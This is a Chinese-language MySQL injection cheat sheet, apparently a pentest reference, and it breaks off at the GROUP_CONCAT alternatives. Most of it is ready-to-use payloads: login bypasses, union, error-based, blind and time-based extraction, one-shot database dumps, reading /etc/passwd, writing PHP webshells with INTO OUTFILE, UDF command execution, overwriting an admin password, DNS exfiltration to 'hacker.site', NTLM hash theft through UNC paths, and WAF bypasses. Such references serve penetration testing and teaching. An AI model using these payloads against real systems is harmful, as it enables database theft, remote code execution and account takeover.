# MySQL 注入

> MySQL 注入是一种安全漏洞类型，当攻击者能够通过注入恶意输入来操纵发送到 MySQL 数据库的 SQL 查询时就会发生这种情况。这种漏洞通常是由于用户输入处理不当引起的，允许攻击者执行任意的 SQL 代码，从而危及数据库的完整性和安全性。

## 概要

* [MYSQL 默认数据库](#mysql-默认数据库)
* [MYSQL 注释](#mysql-注释)
* [MYSQL 测试注入](#mysql-测试注入)
* [MYSQL 联合基于](#mysql-联合基于)
    * [检测列数](#检测列数)
        * [迭代 NULL 方法](#迭代-null方法)
        * [ORDER BY 方法](#order-by方法)
        * [LIMIT INTO 方法](#limit-into方法)
    * [使用 information_schema 提取数据库](#提取数据库-with-information_schema)
    * [在没有 information_schema 的情况下提取列名](#提取列名-without-information_schema)
    * [在不知道列名的情况下提取数据](#提取数据-without-columns-name)
* [MYSQL 错误基于](#mysql-错误基于)
    * [MYSQL 错误基于 - 基本](#mysql-错误基于---基本)
    * [MYSQL 错误基于 - UpdateXML 函数](#mysql-错误基于---updatexml函数)
    * [MYSQL 错误基于 - Extractvalue 函数](#mysql-错误基于---extractvalue函数)
* [MYSQL 盲注](#mysql盲注)
    * [MYSQL 盲注与子串等效](#mysql盲注-with-substring等效)
    * [MYSQL 盲注使用条件语句](#mysql盲注使用条件语句)
    * [MYSQL 盲注与 MAKE_SET](#mysql盲注-with-make_set)
    * [MYSQL 盲注与 LIKE](#mysql盲注-with-like)
    * [MySQL 盲注与 REGEXP](#mysql盲注-with-regexp)
* [MYSQL 基于时间的](#mysql时间基于)
    * [在子查询中使用 SLEEP](#使用睡眠在子查询中)
    * [使用条件语句](#使用条件语句)
* [MYSQL DIOS - 一次性转储](#mysql-dios---一次性转储)
* [MYSQL 当前查询](#mysql当前查询)
* [MYSQL 读取文件内容](#mysql读取文件内容)
* [MYSQL 命令执行](#mysql命令执行)
    * [WEBSHELL - OUTFILE 方法](#webshell---outfile方法)
    * [WEBSHELL - DUMPFILE 方法](#webshell---dumpfile方法)
    * [COMMAND - UDF 库](#command---udf库)
* [MYSQL 插入](#mysql插入)
* [MYSQL 截断](#mysql截断)
* [MYSQL 外带](#mysql外带)
    * [DNS 外泄](#dns外泄)
    * [UNC 路径 - NTLM 哈希窃取](#unc路径---ntlm哈希窃取)
* [MYSQL WAF 绕过](#mysql-waf绕过)
    * [information_schema 的替代方案](#替代方案-to-information_schema)
    * [VERSION 的替代方案](#替代方案-to-version)
    * [GROUP_CONCAT 的替代方案](#替代方案-to-group_concat)
    * [科学记数法](#科学记数法)
    * [条件注释](#条件注释)
    * [宽字节注入 (GBK)](#宽字节注入(gbk))
* [参考](#参考)

## MYSQL 默认数据库

| 名称               | 描述              |
|--------------------|------------------|
| mysql              | 需要 root 权限    |
| information_schema | 从版本 5 及以上可用 |

## MYSQL 注释

MySQL 注释是 SQL 代码中的注释，在 MySQL 服务器执行期间会被忽略。

| 类型                       | 描述                       |
|----------------------------|---------------------------|
| `#`                        | 单行注释                   |
| `/* MYSQL 注释 */`         | C 风格注释                 |
| `/*! MYSQL 特殊 SQL */`    | 特殊 SQL                   |
| `/*!32302 10*/`            | MYSQL 3.23.02 版本注释     |
| `--`                       | SQL 注释                   |
| `;%00`                     | Nullbyte                   |
| \`                         | 回溯符                     |

## MYSQL 测试注入

* **字符串**: 查询如 `SELECT * FROM 表 WHERE id = 'FUZZ';`

    ```ps1
    ' False
    '' True
    " False
    "" True
    \ False
    \\ True
    ```

* **数值**: 查询如 `SELECT * FROM 表 WHERE id = FUZZ;`

    ```ps1
    AND 1     True
    AND 0     False
    AND true True
    AND false False
    1-false     如果易受攻击则返回 1
    1-true     如果易受攻击则返回 0
    1*56     如果易受攻击则返回 56
    1*56     如果不易受攻击则返回 1
    ```

* **登录**: 查询如 `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```

## MYSQL 联合基于

### 检测列数

为了成功执行基于联合的 SQL 注入，攻击者需要知道原始查询中的列数。

#### 迭代 NULL 方法

系统地增加 `UNION SELECT` 语句中的列数，直到负载执行无误或产生可见变化。每次迭代检查列数的兼容性。

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```

#### ORDER BY 方法

持续增加数字，直到收到 `False` 响应。尽管 `GROUP BY` 和 `ORDER BY` 在 SQL 中有不同的功能，但它们都可以以完全相同的方式用于确定查询中的列数。

| ORDER BY        | GROUP BY        | 结果 |
| --------------- | --------------- | ---- |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False |

由于 `ORDER BY 4` 的结果为假，这意味着 SQL 查询只有 3 列。
在基于联合的 SQL 注入中，你可以通过 `-1' UNION SELECT 1,2,3--+` 来 `SELECT` 任意数据并在页面上显示。

类似于前面的方法，如果启用了错误显示，我们可以在一个请求中检查列数。

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # 未知列 '4' 在 'order 子句'
```

#### LIMIT INTO 方法

当启用了错误报告时，此方法非常有效。它可以帮助确定在注入点出现在 LIMIT 子句之后的情况下的列数。

| Payload                      | 错误           |
| ---------------------------- | --------------- |
| `1' LIMIT 1,1 INTO @--+`     | `使用的 SELECT 语句具有不同数量的列` |
| `1' LIMIT 1,1 INTO @,@--+`  | `使用的 SELECT 语句具有不同数量的列` |
| `1' LIMIT 1,1 INTO @,@,@--+` | `没有错误意味着查询使用 3 列` |

由于结果没有任何错误，这意味着查询使用 3 列: `-1' UNION SELECT 1,2,3--+`。

### 使用 information_schema 提取数据库

此查询检索服务器上所有模式（数据库）的名称。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

此查询检索指定模式中所有表的名称（模式名称由 PLACEHOLDER 表示）。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

此查询检索指定表中所有列的名称。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

此查询旨在从特定表中检索数据。

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

### 在没有 information_schema 的情况下提取列名

适用于 `MySQL >= 4.1` 的方法。

| Payload | 输出 |
| --- | --- |
| `(1)and(SELECT * from db.users)=(1)` | 操作数应包含 **4** 列 |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | 列 '**id**' 不能为 NULL |

适用于 `MySQL 5` 的方法。

| Payload | 输出 |
| --- | --- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | 重复列名 '**id**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | 重复列名 '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | 数据 |

### 在不知道列名的情况下提取数据

从第 4 列中提取数据，而不知道其名称。

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

在查询 `select author_id,title from posts where author_id=[INJECT_HERE]` 中的注入示例：

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## MYSQL 错误基于

| 名称         | Payload         |
| ------------ | --------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |

### MYSQL 错误基于 - 基本

适用于 `MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### MYSQL 错误基于 - UpdateXML 函数

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

更短的可读版本：

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MYSQL 错误基于 - Extractvalue 函数

适用于 `MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### MYSQL 错误基于 - NAME_CONST 函数 (仅常量)

适用于 `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## MYSQL 盲注

### MYSQL 盲注与子串等效

| 函数 | 示例 | 描述 |
| --- | --- | --- |
| `SUBSTR` | `SUBSTR(version(),1,1)=5` | 从字符串中提取子串（从任意位置开始） |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | 从字符串中提取子串（从任意位置开始） |
| `RIGHT` | `RIGHT(left(version(),1),1)=5` | 从字符串中提取一定数量的字符（从右开始） |
| `MID` | `MID(version(),1,1)=4` | 从字符串中提取子串（从任意位置开始） |
| `LEFT` | `LEFT(version(),1)=4` | 从字符串中提取一定数量的字符（从左开始） |

使用 `SUBSTRING` 或其他等效函数进行盲 SQL 注入的示例：

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### MYSQL 盲注使用条件语句

* TRUE: `if @@version 以 5 开头`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    响应：
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `if @@version 以 4 开头`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    响应：
    HTTP/1.1 200 OK
    ```

### MYSQL 盲注与 MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL 盲注与 LIKE

在 MySQL 中，`LIKE` 操作符可用于查询中的模式匹配。该操作符允许使用通配符来匹配未知或部分字符串值。这在盲 SQL 注入上下文中特别有用，当攻击者不知道存储在数据库中的数据的长度或具体内容时。

LIKE 中的通配符：

* **百分号** (`%`): 此通配符表示零个、一个或多个字符。它可以用来匹配任何字符序列。
* **下划线** (`_`): 此通配符表示单个字符。它用于更精确的匹配，当你知道数据结构但不知道特定位置的具体字符时。

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### MySQL 盲注与 REGEXP

盲 SQL 注入也可以使用 MySQL 的 `REGEXP` 操作符进行，该操作符用于将字符串与正则表达式匹配。当攻击者想要执行比 `LIKE` 操作符所能提供的更复杂的模式匹配时，这种方法尤其有用。

| Payload | 描述 |
| --- | --- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | 检查长度 |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | 检查是否存在数字 |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | 检查是否以 "a" 开头 |

## MYSQL 基于时间的

以下 SQL 代码将延迟来自 MySQL 的输出。

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)

    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)

    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### 使用 SLEEP 在子查询中

提取数据的长度。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

提取第一个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

提取第二个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

提取第三个字符。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

提取 column_name。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### 使用条件语句

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MYSQL DIOS - 一次性转储

DIOS (Dump In One Shot) SQL 注入是一种高级技术，允许攻击者在一个精心设计的 SQL 注入负载中一次性提取整个数据库内容。此方法利用了将多段数据连接成单一结果集的能力，然后从数据库中一次性返回。

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

* SecurityIdiots

    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* Profexer

    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
    ```

* Dr.Z3r0

    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* M@dBl00d

    ```sql
    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* Zen

    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik

    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```

## MYSQL 当前查询

`INFORMATION_SCHEMA.PROCESSLIST` 是 MySQL 和 MariaDB 中的一个特殊表，提供有关数据库服务器中活动进程和线程的信息。此表可以列出数据库正在执行的所有操作。

`PROCESSLIST` 表包含几个重要列，每个列都提供有关当前进程的详细信息。常见列包括：

* **ID** : 进程标识符。
* **USER** : 执行进程的 MySQL 用户。
* **HOST** : 启动进程的主机。
* **DB** : 进程正在访问的数据库（如果有）。
* **COMMAND** : 进程正在执行的命令类型（例如，Query，Sleep）。
* **TIME** : 进程运行的时间（秒）。
* **STATE** : 进程的当前状态。
* **INFO** : 正在执行的语句的文本，如果没有执行语句则为 NULL。

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

一次性转储查询以提取整个表的内容。

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MYSQL 读取文件内容

需要 `filepriv`，否则会得到错误：`ERROR 1290 (HY000): MySQL 服务器正在使用 --secure-file-priv 选项运行，因此无法执行此语句`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

如果你是数据库的 root 用户，可以通过以下查询重新启用 `LOAD_FILE`：

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL 命令执行

### WEBSHELL - OUTFILE 方法

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL - DUMPFILE 方法

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND - UDF 库

首先，你需要检查服务器上是否安装了 UDF。

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

然后可以使用 `sys_exec` 和 `sys_eval` 等函数。

```sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id')                                   |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MYSQL 插入

`ON DUPLICATE KEY UPDATE` 关键字用于告诉 MySQL 当应用程序尝试插入已存在于表中的行时应该做什么。我们可以使用这个关键字来更改管理员密码：

通过 payload 注入：

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

查询看起来像这样：

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

这条查询将为用户 `"attacker_dummy@example.com"` 插入一行。它还将为用户 `"admin@example.com"` 插入一行。

因为这一行已经存在，`ON DUPLICATE KEY UPDATE` 关键字告诉 MySQL 将现有行的 `password` 列更新为 `"P@ssw0rd"`。之后，我们可以简单地使用 `"admin@example.com"` 和密码 `"P@ssw0rd"` 进行认证。

## MYSQL 截断

在 MYSQL 中，`admin` 和 `admin` 是相同的。如果数据库中的用户名列有字符限制，其余的字符会被截断。因此，如果数据库的列限制为 20 个字符，并且我们输入了一个 21 个字符的字符串，最后的 1 个字符将被移除。

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`

## MYSQL 外带

```powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS 外泄

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC 路径 - NTLM 哈希窃取

术语“UNC 路径”指的是用于指定网络上资源（如共享文件或设备）位置的通用命名约定路径。它通常在 Windows 环境中使用，用于通过格式 `\\server\share\file` 访问网络上的文件。

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

:warning: 不要忘记转义 `'\\'`。

## MYSQL WAF 绕过

### information_schema 的替代方案

`information_schema.tables` 的替代方案

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### VERSION 的替代方案

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

### GROUP_CONCAT 的替代方案

要求：`MySQL >= 5.7.22`

使用 `json_arrayagg()` 替代 `group_concat()`，允许显示更少的符号

* `group_concat()` = 1024 符号
* `json_arrayagg()` > 16,000,000 符号

```sql